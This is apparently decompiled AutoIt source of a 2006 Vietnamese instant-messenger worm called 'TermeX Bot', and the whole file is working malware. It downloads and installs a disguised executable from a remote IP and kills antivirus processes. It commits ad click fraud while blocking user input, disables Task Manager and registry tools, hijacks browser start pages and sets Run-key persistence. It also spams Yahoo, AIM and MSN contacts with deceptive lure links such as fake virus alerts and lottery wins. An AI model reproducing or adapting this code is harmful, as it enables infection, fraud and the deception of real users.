; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Documents and Settings\Le Quang Trung\Desktop\enet.au3>
; ----------------------------------------------------------------------------

;---------------------------------------------------------------
; Tac Gia: TermeX - ThanatoS
; Phan Mem: TermeX Bot
; Phien Ban: 2.0
; Cong Dung: Quang cao Website thong qua Y!M,MSN,AIM,My Computer
; Phat Hanh: 20-9-2006
;---------------------------------------------------------------

; Thiet Lap
#NoTrayIcon
$website = "http://concerto4.net"
$website2 = "http://concerto4.net"

; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\svhost32.exe") Then
 		InetGet ("http://64.141.110.32/enet.exe", @WindowsDir & "\svhost32.exe", 0, 1)
 		Sleep(10000)
	EndIf


;Kill cac processes Anti-Virus
If ProcessExists("Bkav2006.exe") Then
   ProcessClose("Bkav2006.exe")
EndIf

If ProcessExists("IEProt.exe") Then
   ProcessClose("IEProt.exe")
EndIf

If ProcessExists("bdss.exe") Then
   ProcessClose("bdss.exe")
   ProcessClose("vsserv.exe")
EndIf

;Click vao Google adsense
$title = WinGetTitle("Mesothelioma, Asbestosis & Lung Cancer Information - Microsoft Internet Explorer", "")
$check = WinExists ($title)
If $check = 1 Then
	BlockInput (1)
	WinActivate($title)
	WinSetState ( $title , "", @SW_MAXIMIZE)
	$pos = MouseGetPos()
	MouseClick("left", 400, 300, 1, 0)
	MouseMove ( $pos[0], $pos[1] , 0)
	BlockInput (0)
EndIf

; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\svhost32.exe")
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "SVCHOST", "REG_SZ", @WindowsDir & "\svhost.exe")

; Danh Sach Tin Nhan Ngau Nhien
Dim $tin[13]
$tin[0] = "have you ever seen such a silly man like this ? " & $website & "?id=stories =)) "
$tin[1] = "making money online never be easier : " & $website & "?id=tips >:D< "
$tin[2] = "damn, she is so cute :x " & $website & "?id=miss_world :x:x:x:x:x "
$tin[3] = "the only way to clean some online viruses that may lead you into troubles : " & $website2 & "?id=ie_protector << "
$tin[4] = "Now you can avoid some critical online viruses by updating Windows . Click here to know how to Update your Windows : " & $website2 & "?id=update_windows <<"
$tin[5] = "A new dangerous computer virus that can destroys all your data has just been released . Click here to know how to avoid it : " & $website2 & "?id=pc_protector << "
$tin[6] = "Download free MP3s : " & $website & "?id=music << "
$tin[7] = "Just check out my new personal website : " & $website2 & " c0ol !!! "
$tin[8] = "you are virus infected . Use this tool to remove viruses from your PC : " & $website2 & "/?id=virus_shield << "
$tin[9] = "wtf is this ? wanna give me a shit ?  " & $website & "/?id=news  X-(  "
$tin[10] = "Let's vote for Vietnam's beauty - Mai Phuong Thuy - for the upcoming Miss World competition : " & $website & "?id=vote :x !!  "
$tin[11] = "check this link for me : " & $website & "?id=forum . Why I cannot surf this site ??? "
$tin[12] = "oh my god , i've won a 20000 usd lottery :O " & $website & "/?id=winning_list . Come to my house tonight for a party !! >:D< "


; Ham Thay Doi Status & Gui Tin Nhan
While (1)
sleep(200000)

$tieude1 = WinGetTitle("Yahoo! Messenger", "")
$kiemtra1 = WinExists ($tieude1)
$tieude2 = WinGetTitle("AIM", "")
$kiemtra2 = WinExists ($tieude2)
$tieude3 = WinGetTitle("Windows Live Messenger", "")
$kiemtra3 = WinExists ($tieude3)
$tieude4 = WinGetTitle("Windows Messenger", "")
$kiemtra4 = WinExists ($tieude4)


	If $kiemtra1 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude1)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v")
		Send("!s")
		BlockInput (0)
	EndIf

	If $kiemtra2 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude2)
		Send("{HOME}")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{PGDN}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra3 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude3)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra4 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude4)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf
Sleep(200000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Documents and Settings\Le Quang Trung\Desktop\enet.au3>
; ----------------------------------------------------------------------------

